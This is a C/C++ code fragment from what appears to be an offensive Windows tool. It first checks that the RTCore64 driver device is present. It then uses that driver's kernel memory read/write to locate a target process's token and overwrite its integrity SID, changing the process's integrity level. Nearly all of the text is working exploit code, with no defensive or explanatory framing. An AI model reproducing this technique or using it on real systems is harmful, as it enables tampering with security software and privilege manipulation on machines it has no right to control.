BOOL isVulnerableDriverInstalled() {
    HANDLE hDevice = CreateFileW(L"\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if (hDevice == INVALID_HANDLE_VALUE) {
        return false;
    }

    CloseHandle(hDevice);
    return true;
}


// Function Definition:
BOOL SetIntegrityLevel(HANDLE Device, int tPID, DWORD Level) {
	
	// 1. Get target process token
	DWORD64 TargetToken = 0;
	if (!GetTokenByPID(Device, tPID, &TargetToken))
		return FALSE;
	
	// 2. Find Integrity group
	DWORD64 UsersAndGroups = 0;
	DWORD IntegrityIndex = 0;
	//TOKEN_USERGROUPS_OFFSET == 0x98, TOKEN_INTEGRITYINDEX_OFFSET == 0xd0 found from util.hpp
	if (!TDIReadKernel64(Device, TargetToken + TOKEN_USERGROUPS_OFFSET, &UsersAndGroups) ||
		!TDIReadKernel32(Device, TargetToken + TOKEN_INTEGRITYINDEX_OFFSET, &IntegrityIndex))
		return FALSE;
	PRINT("[+] Target process integrity group: UaG=0x%p | idx=0x%x\n", UsersAndGroups, IntegrityIndex);	

	// 3. Retrieve the Integrity SID
	//struct _SID_AND_ATTRIBUTES {
	//	VOID* Sid;						//0x0
	//	ULONG Attributes;				//0x8
	//};
	DWORD64 SIDaddress = 0;
	DWORD64 SIDattribs = 0;
	if (!TDIReadKernel64(Device, UsersAndGroups + IntegrityIndex * 2*sizeof(DWORD64), &SIDaddress) ||
		!TDIReadKernel64(Device, UsersAndGroups + IntegrityIndex * 2*sizeof(DWORD64) + 0x8,  &SIDattribs))
		return FALSE;
	// https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-token_groups
	if (!(SIDattribs & 0x60)) {
		PRINT("[!] Integrity SID not found!\n");
		return FALSE;
	}
	PRINT("[+] Target process SID and attribs: SIDaddr=0x%p | SIDattr=0x%llx\n", SIDaddress, SIDattribs);	

	// 4. Modify Integrity SID
	//struct _SID {
	//	UCHAR Revision;												//0x0
	//	UCHAR SubAuthorityCount;									//0x1
	//	struct _SID_IDENTIFIER_AUTHORITY IdentifierAuthority;		//0x2
	//	ULONG SubAuthority[1];										//0x8
	//};
	DWORD SubAuthority = 0;
	if (!TDIReadKernel32(Device, SIDaddress + 0x8, &SubAuthority))
		return FALSE;
	PRINT("[+] Target process current SubAuthority: sub=0x%llx\n", SubAuthority);	

	PRINT("[+] Enabling new integrity level on target process...");
	SubAuthority = (DWORD32) Level;
	if (!TDIWriteKernel32(Device, SIDaddress + 0x8, SubAuthority)) {
		PRINT("[-] Failed.\n");
		return FALSE;
	} 
	PRINT("[+] Done.\n Target process new SubAuthority: sub=0x%llx\n", SubAuthority);	
	return TRUE;
}
